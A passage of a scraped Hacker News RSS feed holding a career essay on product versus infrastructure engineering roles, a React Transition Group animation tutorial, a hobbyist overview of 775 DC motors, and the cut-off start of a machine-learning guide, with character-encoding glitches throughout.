<p>My goal is to share with you the language that could help you (and your manager) find your ‚Äúsweet spot‚Äù engineering role. It took me a couple of bad internship placements and <em>pure luck</em> to figure this out. So I hope that this essay saves some of you months of job mismatch. Shoutout to <a href="https://twitter.com/bolu_ben">Bolu </a>who after my <a href="https://twitter.com/michlimlim/status/1293336552832151559">Tweet thread</a> on this thesis went viral on Tech Twitter, suggested that I turned the thread into an essay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
<p><strong>‚ÄúProduct/Infra‚Äù maps neatly to the psychology of how engineers pick projects and their motivations for learning to code.</strong> Broadly speaking, there are 2 types of engineers<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>:</p>
<ol>
<li>
<p>‚ÄúProduct-first‚Äù engineers are obsessed with using code to solve a user problem and they see code as just a means to an end.</p>
</li>
<li>
<p>‚ÄúCode-first‚Äù engineers are obsessed with the abstractions, architecture, tools and libraries in the code. Elegant code is the end.</p>
</li>
</ol>
<p>Product-first engineers map to ‚ÄúProduct engineering‚Äù‚Äîbuilding, launching and maintaining features that solve user problems. They often love being in the same room as designers and product managers to learn about users, and they love finding technical opportunities that can improve the product.</p>
<p>Code-first engineers map to ‚ÄúInfrastructure engineering‚Äù‚Äîbuilding infrastructure platforms that support applications, be it via building CI/CD pipelines, implementing logging, or supporting high traffic etc. They‚Äôre motivated to better the craft of programming and are often obsessed with things like test coverage, using the latest technologies, code architecture, etc.</p>
<p>(To be clear, there are ‚ÄúProduct engineering‚Äù and ‚ÄúInfrastructure engineering‚Äù roles whether your users are external customers, third-party developers or internal consumers of an API<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>.)</p>
<p>Notice that both Product engineers and Infrastructure engineers touch the frontend and the backend. Many of them, especially product engineers, choose to specialize into frontend or backend as well. <strong>The ‚ÄúFrontend/Backend‚Äù division is still a valuable axis.</strong></p>
<p><strong>However, using the ‚ÄúFrontend/Backend‚Äù in isolation of ‚ÄúProduct/Infra‚Äù in project selection can lead to engineer-job Mismatch. Especially amongst Product engineers.</strong> I am a Product engineer. When I tried out ‚ÄúBackend engineering‚Äù in an internship, I was assigned to an Infra role where day-to-day I migrated databases. I had joined the company because I wanted to work on their product. But I didn‚Äôt have the language to explain that to my recruiter. They conflated ‚ÄúBackend‚Äù with ‚ÄúInfra‚Äù and I ended up with a role too far from the user.</p>
<p>When I tried out ‚ÄúFrontend engineering‚Äù in another internship, I was assigned to a product close to the user. But the frontend engineers and I were left out of the meetings that discussed how the features would solve problems.</p>
<p>If you split your engineers by the type of technology they work on (i.e. ‚ÄúFrontend/Backend‚Äù), it is easy to assume that your Frontend engineers are happy to just work on translating finalized designs into UI/UX components. But if you split them based on their motivations (i.e.‚ÄùProduct/Infra‚Äù), you‚Äôd want to loop your Frontend product engineers into product discussions.</p>
<p>(The same engineer-job mismatch happens for Infra engineers too, but it is less prevalent because the ‚ÄúFrontend‚Äù and ‚ÄúBackend‚Äù labels usually only officially apply in Product engineering.)</p>
<p>Now, this next part may be a reach‚Ä¶ but I think <strong>many new grad Product engineers choose to be Product <em>Managers</em></strong> <strong>because of this inadequate ‚ÄúFrontend/Backend‚Äù division</strong><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Let‚Äôs jump back to my two internship examples. How would you feel if these were your only two internships over your college career? Given that you spent 12 weeks in each role, wouldn‚Äôt it be reasonable to conclude that those roles were mostly what ‚Äúfrontend‚Äù and ‚Äúbackend‚Äù were all about? Wouldn‚Äôt it be reasonable too to conclude that since you didn‚Äôt like both types of engineering, maybe engineering as a whole wasn‚Äôt for you? (And this self-dejection is especially easy to fall into if you are part of an underrepresented minority in engineering.) Why not be a <em>Product</em> manager and solve user problems?</p>
<p>This scenario is very common. Engineering is esoteric. Even with an intern-team matching process, an Product engineering intern may not know that they should select Product engineering roles, let alone know which roles are Product engineering roles.</p>
<p><strong>But what if that same intern uses the ‚ÄúProduct/Infra‚Äù language and advocates for a ‚ÄúProduct Engineering‚Äù role?</strong></p>
<p>I was such an intern. I was so drained by my Infra role that I reached out to Product Managers in the company to enquire about their jobs. But then I advocated<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> for a Product Engineering role and‚Ä¶ my manager gave it to me. As a backend engineer on a product team, I worked with a team to <a href="https://techcrunch.com/2019/10/03/stock-trading-app-robinhood-revamps-its-newsfeed-with-the-wall-street-journal-and-ad-free-videos/">build the Video Newsfeed in Robinhood</a>. I built a large backend pipeline and also had the chance to engage with product questions regarding newsfeed ranking, video tagging, and user engagement. I spoke with engineering, data science, and business, balanced those interests, and wrote the resolution in code.</p>
<p>I found my sweet spot.</p>
<p><strong>At the end of the day, engineering is multifaceted and can be defined along more than one axis:</strong> B2B vs. B2C, B2B top-down vs. B2B ‚Äúbottom-up‚Äù, API-first vs. application-first, ‚ÄúForward deployed‚Äù vs. ‚ÄúSoftware engineer‚Äù, etc. If we‚Äôre serious about making engineering accessible to all, we should champion any and all frameworks that can help new engineers find their sweet spot and be happy.</p>
<!-- raw HTML omitted -->
<h3 id="notes">Notes</h3>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I had met Bolu, a new grad in Bloomberg London, after he sent me a cold DM to thank me for the thread. He had sent my thread to his manager!!! It turned out that he had been struggling to express his project preferences to his manager, and the thread helped. The manager ‚Äúgot‚Äù it after reading the thread and now Bolu is on a product development team he is very excited about. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>I took the ‚Äúcode-first‚Äù vs. ‚Äúproduct-first‚Äù engineer terminology from Xoogler Zach Lloyd‚Äôs blog: <a href="https://thezbook.com/">https://thezbook.com/</a> <a href="#fnref:2" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Someone on Twitter (leon @lievetraz) replied with their attempt to classify internal tools teams into ‚ÄúProduct/Infra‚Äù <a href="https://twitter.com/lievetraz/status/1293555767430336518?s=20">here</a>. <a href="#fnref:3" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>There are hundreds of other reasons engineers choose to be PMs of course. <a href="#fnref:4" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>I learned it the hard way how important it was to advocate for oneself and ask to change teams early. <a href="#fnref:5" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>

		</div></div>]]>
            </description>
            <link>https://www.michellelim.org/writing/stop-using-frontend-backend/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519400</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Use React Transition Group and React Animation Library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519397">thread link</a>) | @mehdios
<br/>
September 18, 2020 | https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library | <a href="https://web.archive.org/web/*/https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>A few months ago, I gave a talk with a coworker at the tech conference <a href="https://connect.tech/" target="_blank" rel="noreferrer">Connect.Tech</a> about the ever-growing need for responsive web design when building websites and applications. During the presentation, we discussed a few different ways to approach it, specifically when it comes to the JavaScript framework <a href="https://reactjs.org/" target="_blank" rel="noreferrer">React</a>.</p><p>While I won‚Äôt go into all the details in our talk of how to approach responsive design (if you‚Äôd like, you can see the full <a href="https://drive.google.com/drive/folders/1oRtHrgzpPorn9ogGpAxA5lPrH3ycCYK9" target="_blank" rel="noreferrer">slide deck of the talk</a> here), I did want to share a handy React animation library I stumbled across while building the mobile-responsive demo application, called <a href="https://reactcommunity.org/react-transition-group/" target="_blank" rel="noreferrer">React Transition Group</a>.</p><hr><h2 id="react-transition-group">React Transition Group</h2><h3 id="what-makes-it-different">What makes it different?</h3><p>Unlike other React animation libraries like <a href="https://www.react-spring.io/" target="_blank" rel="noreferrer">React Spring</a> or <a href="https://www.react-reveal.com/" target="_blank" rel="noreferrer">React Reveal</a>, React Transition Group ‚Äúexposes simple components useful for defining entering and exiting transitions‚Ä¶it does not animate styles by itself. Instead it exposes transition stages, manages classes and group elements and manipulates the DOM in useful ways, making the implementation of actual visual transitions much easier.‚Äù</p><p>React Transition Group is a lower-level type of animation library. It doesn‚Äôt care nearly as much about what type of animation you‚Äôd like to do, it just makes it easier to do any sort of animation on any React component with as little hassle as it can.</p><p>And it doesn‚Äôt hurt to know that React Transition Group began in the original React framework (it‚Äôs mentioned in the <a href="https://reactjs.org/docs/animation.html" target="_blank" rel="noreferrer">docs</a>) before being spun out into a new package to be maintained by the community. That‚Äôs a pretty good endorsement for trying RTG, in my book.</p><p>Now that you know a little more about RTG‚Äôs approach to animation, let me cover a few of the different component options it gives users, and how they work.</p><h3 id="types-of-rtg-components">Types of RTG Components</h3><p>React Transition Group offers four different types of components for users to choose from based on their animation needs.</p><h4 id="transition"><a href="http://reactcommunity.org/react-transition-group/transition" target="_blank" rel="noreferrer">Transition</a></h4><p>The first component to cover is <code>Transition</code>. This component lets you describe a transition from one component state to another over a span of time with a simple API. Most commonly it‚Äôs used to animate the mounting and unmounting of a component, but it can also be used to describe in-place transition states as well. Personally, I tend to favor <code>CSSTransition</code> over the straight <code>Transition</code> component, but that‚Äôs just me.</p><p>The transition component tracks the ‚Äúenter‚Äù and ‚Äúexit‚Äù states for the component. The four main states a <code>Transition</code> can be in are:</p><ul><li><code>'entering'</code></li><li><code>'entered'</code></li><li><code>'exiting'</code></li><li><code>'exited'</code></li></ul><p>The transition state is toggled on via the <code>in</code> prop, when it‚Äôs <code>true</code> the component will begin the <code>entering</code> stage for the duration of the transition until it‚Äôs fully visible, at which point it will switch to the <code>entered stage</code>. Upon exit, the same things will happen with <code>exiting</code> and <code>exited</code>.</p><p>A simple example of fading in a component on enter and fading it out on exit might look something like this:</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/9efe4f24aa53f11293ce58d69872f358/c701c/64f21e0d419d45d0981b2cdff0f8aad5.png" srcset="https://blog.asayer.io/static/9efe4f24aa53f11293ce58d69872f358/c701c/64f21e0d419d45d0981b2cdff0f8aad5.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>This illustrates using React Transition Group‚Äôs Transition component to fade a component into view for the user.</p><p>In the example above, once the <code>inProp</code> prop is <code>true</code>, the <code>Transition</code> component will activate and begin fading in to view courtesy of the <code>transitionStyles</code> variable (where opacity is defined) that correspond to the various ‚Äúenter‚Äù or ‚Äúexit‚Äù stages I outlined earlier.</p><p>It‚Äôs worth noting this is a platform-agnostic base component ‚Äî if you‚Äôre looking for CSS transitions (like I was for my use case), you‚Äôll probably want the <code>CSSTransition</code> component instead.</p><h4 id="csstransition"><a href="http://reactcommunity.org/react-transition-group/css-transition" target="_blank" rel="noreferrer">CSSTransition</a></h4><p>If you‚Äôre using CSS transitions or animations, the <code>CSSTransition</code> component is what you‚Äôll want to use; it‚Äôs built upon the <code>Transition</code> component, so it inherits all of its props.</p><p>To work, <code>CSSTransition</code> applies a pair of class names during the <code>appear</code>, <code>enter</code>, and <code>exit</code> states of the transition. The first class is applied and then a second <code>*-active</code> class in order to activate the CSS transition. After the transition, matching <code>*-done</code> class names are applied to persist the transition state.</p><p>For instance, if your <code>CSSTransition</code> component‚Äôs <code>classNames</code> property is <code>sample</code>, you‚Äôd first see <code>sample-enter</code>, then <code>sample-enter-active</code>, and finally <code>sample-enter-done</code> for the ending state when the animation is done. And when it‚Äôs time to reverse the animation (such as with a modal or slider that needs to disappear or exit the screen), you‚Äôd see it cycle through sample-exit and <code>sample-exit-active</code> and <code>sample-exit-done</code> on your component‚Äôs <code>classNames</code> property.</p><p>Here‚Äôs a simplified code sample of what the JSX and accompanying CSS classes might looks like for making a <code>div</code> of text fade in or out. (I‚Äôve omitted the imports at the top of the file because they‚Äôre the same named import for each type of component from RTG: <code>import { CSSTransition } from 'react-transition-group';</code>.)</p><p>First the JavaScript code showing the <code>CSSTransition</code> component wrapping a <code>div</code> element to show or hide based on the state of <code>isVisible</code>, which is toggled by the <code>button</code> element underneath.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/3515a6d029b73b303e0539692b5978ca/c701c/d6b0f48014e442b2808bab67f08db67e.png" srcset="https://blog.asayer.io/static/3515a6d029b73b303e0539692b5978ca/c701c/d6b0f48014e442b2808bab67f08db67e.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>Here‚Äôs the JavaScript JSX code where the CSSTransition component is used to wrap the div and text to show or hide.</p><p>And here‚Äôs the CSS classes that the <code>CSSTransition</code> component would experience once <code>isVisible</code> became <code>true</code> and triggered the <code>in</code> prop to fade the text in or out (just like with the original <code>Transition</code> component).</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/02bcfaf7381a16c3998109602a07c7ac/35a7a/169f998ad1eb4d08b0afb2fbd042a3e5.png" srcset="https://blog.asayer.io/static/02bcfaf7381a16c3998109602a07c7ac/35a7a/169f998ad1eb4d08b0afb2fbd042a3e5.png 678w" sizes="(max-width: 678px) 100vw, 678px" alt="text">
The CSS transition states that will actually cause the text wrapped in the CSSTransition to component to fade in and out of view.</p><p><code>*-active</code> classes represent which styles you want to animate to, so it‚Äôs important to add the <code>transition</code> declaration only to them, otherwise transitions might not behave as intended. This might not be obvious when the transitions are symmetrical, i.e. when <code>*-enter-active</code> is the same as <code>*-exit</code>, but it becomes apparent quickly in more complex transitions.</p><p>Let‚Äôs move on now to React Transition Group‚Äôs next option: <code>SwitchTransition</code>.</p><h4 id="switchtransition"><a href="http://reactcommunity.org/react-transition-group/switch-transition" target="_blank" rel="noreferrer">SwitchTransition</a></h4><p>This component is useful if you want to control the render between state transitions, it‚Äôs inspired by Vue transition modes. Based on the selected mode (<code>in-out</code> or <code>out-in</code>), and the child‚Äôs key which is the <code>Transition</code> or <code>CSSTransition</code> component, the <code>SwitchTransition</code> makes a consistent transition between them.</p><p>If <code>out-in</code> mode is selected, <code>SwitchTransition</code> waits until the old child leaves and then inserts a new child. If the <code>in-out</code> mode is selected, the <code>SwitchTransition</code> inserts a new child first, waits for the new child to enter and then removes the old child.</p><p>Here‚Äôs an example so you can see how the code might be structured to make two different buttons ‚Äúswitch‚Äù places in the DOM based on the current state. Once again, imports at the top of the file omitted for brevity.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/6dc8f8b809be33ace62ee282577d863c/c701c/e929fbca71584d77979d6f168e1b7527.png" srcset="https://blog.asayer.io/static/6dc8f8b809be33ace62ee282577d863c/c701c/e929fbca71584d77979d6f168e1b7527.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>The Button element gets replaced each time it‚Äôs clicked with a new button featuring the opposite text of what the previous button text was, courtesy of SwitchTransition.</p><p>Here, <code>SwitchTransition</code> wraps the <code>CSSTransition</code> component, which actually handles the logic and animating of entering a new <code>Button</code> and exiting the existing one. The <code>key</code> in <code>CSSTransition</code> keeps track of state in the component, and every time the state changes (based on a button click), the <code>CSSTransition</code> component takes action and <code>SwitchTransition</code> handles the keeping the old button visible until after the new button has appeared, which <code>CSSTransition</code> is fading out based on its event listener.</p><p>That <code>addEndListener</code> function is crucial to animating the switch between elements, without it, the state (and components) will instantaneously flip like there‚Äôs no animations at all.</p><p>Here‚Äôs the CSS for the <code>fade</code> class name associated with <code>CSSTransition</code>.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/7eb014167a0e99f5bbd2326cffa4833e/785ee/0db7765eeaba4055ad37958754158c47.png" srcset="https://blog.asayer.io/static/7eb014167a0e99f5bbd2326cffa4833e/785ee/0db7765eeaba4055ad37958754158c47.png 830w" sizes="(max-width: 830px) 100vw, 830px" alt="text"></p><p>This CSS is really for the animated entrances and exits of the buttons in the DOM, but I wanted to show it anyway.</p><p>The CSS here is really concerned with the <code>CSSTransition</code> component wrapped inside of <code>SwitchTransition</code>, but I figure the more sample code you see for how to animate things in and out of the DOM, the better.</p><p>It takes some trial and error to get it right, but the documentation for <code>SwitchTransition</code> is good and I‚Äôm sure you‚Äôll figure it out without much of a problem if this is the kind of animation you desire in your application.</p><h4 id="transitiongroup"><a href="http://reactcommunity.org/react-transition-group/transition-group" target="_blank" rel="noreferrer">TransitionGroup</a></h4><p>Last but not least is the { <code>&lt;TransitionGroup&gt;</code> component. This component manages a set of transition components (<code>&lt;Transition&gt;</code> and <code>&lt;CSSTransition&gt;</code>) in a list. Like with the individual transition components, <code>&lt;TransitionGroup&gt;</code> is a state machine for managing the mounting and unmounting of components over time.</p><p>Please note that <code>&lt;TransitionGroup&gt;</code> does not define any animation behavior. Exactly how a list item animates is up to the individual transition component, which means you can mix and match animations across different list items, which could be handy.</p><p>Unlike <code>SwitchTransition</code> which lets you control the entering and exiting of elements in the DOM, <code>TransitionGroup</code> will make the animations happen simultaneously (i.e., to remove the old child and insert a new child at the same time).</p><p>Take a look at this example of a simple chore list that can have chores removed from it once they‚Äôre completed. First, the JSX code with no imports in the example.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/696c29d6c1ac505a74a051878b114d5a/c701c/5bb9a009e4d94e0e81c78c238290a569.png" srcset="https://blog.asayer.io/static/696c29d6c1ac505a74a051878b114d5a/c701c/5bb9a009e4d94e0e81c78c238290a569.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>TransitionGroup wraps the list of CSSTransition components which will be removed from the list as they‚Äôre completed.</p><p>And, here‚Äôs the CSS that will make the chores fade out of the DOM as they‚Äôre removed.</p><p><img tabindex="0" loading="lazy" src="https://blog.asayer.io/static/adcbcf374b3e2bf86f2bfbe953e6fa60/c701c/b9a4155d9b014fdc807698a8f90f2154.png" srcset="https://blog.asayer.io/static/adcbcf374b3e2bf86f2bfbe953e6fa60/c701c/b9a4155d9b014fdc807698a8f90f2154.png 875w" sizes="(max-width: 875px) 100vw, 875px" alt="text"></p><p>Once more, the CSS belongs to the CSSTransition components so they can enter and leave the DOM in an animated fashion.</p><p>And with that, I‚Äôve covered all the main component options React Transition Group offers. All in all, using one or more of these components together gives you fine grained control over what type of and how your React components animate in the DOM.
Now, let‚Äôs get down to the business of how exactly I used React Transition Group to animate my mobile navbar in my demo site.</p><hr><h2 id="how-i-used-rtg-in-my-react-app">How I used RTG in My React App</h2><p>The use case I had for React Transition Group is a fairly standard one, I‚Äôm sure.
For my app, a movie demo site I built using the <a href="https://developers.themoviedb.org/3/getting-started/introduction" target="_blank" rel="noreferrer">Movie Database API</a> for a data source, when it was in mobile view, I wanted the navbar (normally across the top of the page in larger layouts) to condense down to ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library">https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/how-to-use-react-transition-group-react-animation-library</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519397</guid>
            <pubDate>Fri, 18 Sep 2020 17:19:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All about 775 Motor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519390">thread link</a>) | @Gedxx
<br/>
September 18, 2020 | https://www.ikkaro.net/775-motor/ | <a href="https://web.archive.org/web/*/https://www.ikkaro.net/775-motor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			

<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg" alt="what is 775 motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-motor.jpg 1280w"></figure>



<p>The <strong>775 motors ar</strong>e direct current motors used in many projects and which I think are very little known to people.</p>



<p>When we talk about this type of motor, the 7<strong>75 refers to the size of the motor that is standard</strong>. Thus we can find 775 manufactured by different brands, with different operating voltages and different power, with 1 set of bearings or two. But what they all respect is the size of the motor.</p>



<p>My idea was to buy 2 motors with brush. One 12V, with less torque but many revolutions that I wanted to use to make a blower and the one you see in the picture that is a 288W beast and a lot of torque, to try to make a mini-kart for my daughters. But the one with the blower was out of stock and I only got this one.</p>




<p>The video that inspired me for the Air blower</p>



<figure><p>
<iframe title="How to Make Powerful 12volt Air Blower Using 775 Motor and PVC Pipe" width="825" height="464" src="https://www.youtube.com/embed/64p4tkjnsFQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>So I talk in general about the 775 and I will talk about my personal projects.</p>



<h2><span id="Features">Features</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg" alt="775 dc brush motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-spindle-motor.jpg 1280w"></figure>



<p>They are direct current motors, but with a lot of power and torque. <strong>They usually work between 6 and 36 V</strong>, depending on what you buy, the range will vary and can consume up to 12A, so be careful where you connect it.</p>



<p>Its dimensions are 66.7x 42 mm is the size of the outer cylinder, with a diameter of 42mm and 5 mm of shaft.</p>



<p>That shaft usually protrudes 17 mm although this already varies depending on the manufacturer.</p>



<p>As for the output shaft can buy it circular or D depending on the needs you have in your project.</p>



<p><strong>Brushless motors are more efficient</strong>, but remember that you must use a controller for its operation, while a motor with brushes with applied voltage will work.</p>



<p>They are high speed motors, which can range from 12,000 rpm to 21,000 rpm</p>



<h2><span id="Datasheet">Datasheet</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg" alt="775 features and datasheet" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/power-wheels-775-motor.jpg 1280w"></figure>



<p><strong>Look for your manufacturer‚Äôs model datasheet</strong>, as there is no single datasheet for the 775 because they are different engines and each brand will have different characteristics and voltage, power, etc.</p>



<p>I leave you an example, but what you have to do is look for the datasheet of the model you have bought. There you can see not only the engine size but also its technical characteristics</p>



<p>My purchase is of the <strong>brand HANPOSE 775 motor DC 12V 24V 80W 150W 288W</strong> And as you see we can choose from 3 different powers. I have taken the largest of 288W</p>



<figure><table><tbody><tr><td>Model</td><td>775</td></tr><tr><td>Axis diameter</td><td>5mm</td></tr><tr><td>Mounting hole size</td><td>M4</td></tr><tr><td>Mounting hole</td><td>2</td></tr></tbody></table></figure>



<figure><table><tbody><tr><td>Motor Power&nbsp;(W)</td><td>Nominal Voltage&nbsp;(V)</td><td>Max current&nbsp;(A)</td><td>Max Torque&nbsp;(KG)</td><td>Max velocity&nbsp;(RPM)</td></tr><tr><td>80W</td><td>12</td></tr><tr><td>24</td><td>8000</td><td>6A</td><td>1.8</td><td>4000</td></tr><tr><td>150W</td><td>12</td></tr><tr><td>24</td><td>15000</td><td>12A</td><td>3.2</td><td>7500</td></tr><tr><td>288W</td><td>12</td></tr><tr><td>24</td><td>12000</td><td>12A</td><td>3.8</td><td>6000</td></tr></tbody></table></figure>



<p><strong>Features:</strong></p>



<ol><li>Double ball bearing design</li><li>With cooling fan.</li><li>Low noise, smooth running.</li></ol>



<h2><span id="Projects_we_can_make">Projects we can make</span></h2>



<figure><img src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg" data-src="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg" alt="hanpose 288W 775 motor" data-srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor.jpg 1280w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-1024x682.jpg 1024w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-300x200.jpg 300w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor-768x512.jpg 768w, https://www.ikkaro.net/wp-content/uploads/2020/09/775-dc-motor.jpg 1280w"></figure>



<p>If you don‚Äôt know them, you will be surprised by the amount of <strong>projects and inventions we can do with them</strong>. They are usually things that require torque and power.</p>



<p>The one I have bought for example is 288W</p>



<p>I leave a list with ideas</p>



<ul><li>Blower</li><li>Vacuum cleaner</li><li>Water pump</li><li>Drill</li><li>Karts, electric bikes, scooters and any other type of apparatus with wheels that we want to move</li><li>Saws</li></ul>



<p>There is a Youtube playlist dedicated to tools made with 775 engines and PVC pipes and it is amazing</p>



<figure><p>
<iframe title="Great Useful tool with 775 motor and PVC Pipe" width="825" height="464" src="https://www.youtube.com/embed/videoseries?list=PLU_ixO5WDlXte5hucIh01v1DWFD4kTlju" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Another project I want to do is a mini kart </p>



<figure><p>
<iframe title="Build a Mini Electric Cycle Kart using Two 775 Motor -  Electric Car - Tutorial (Upgrade)" width="825" height="464" src="https://www.youtube.com/embed/1MIPhcCHIZY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<h2><span id="What_to_look_for_if_you_are_buying_a_775">What to look for if you are buying a 775</span></h2>



<p>As you will get many models of engines look at these things</p>



<ul><li>If you have brushes or are brushless</li><li>The nominal operating voltage</li><li>The Amperes you consume</li><li>The pair</li><li>The rpm</li><li>If you have one set or 2 ball steals</li></ul>



<p>With this you have to play around and adapt the motor to what you want to get. Do you need a lot of torque like on an electric bike that has to move a lot of weight or a lot of revolutions like in a vacuum cleaner?</p>



<p>Do you have a power supply or batteries that deliver the required V and A without any problem?</p>



<p>Do you want a more efficient brushless motor, managed with a controller or is it worth something more coarse that you can control directly by modifying the voltage?</p>



<p>If you have two sets of bearings, it‚Äôs more stable<br>Where to buy them</p>



<p>Well, there are many online stores where you can buy them and the prices do not vary much. I leave you links to Amazon, ebay, Aliexpress and Bangood</p>



<p>The average price is between 8 and 13 dollars.</p>
		</div></div>]]>
            </description>
            <link>https://www.ikkaro.net/775-motor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519390</guid>
            <pubDate>Fri, 18 Sep 2020 17:18:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Learn Machine Learning and Deep Learning: A Guide for Software Engineers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519166">thread link</a>) | @renanmoura
<br/>
September 18, 2020 | https://renanmf.com/machine-learning-and-deep-learning-software-engineers/ | <a href="https://web.archive.org/web/*/https://renanmf.com/machine-learning-and-deep-learning-software-engineers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2>Introduction</h2>
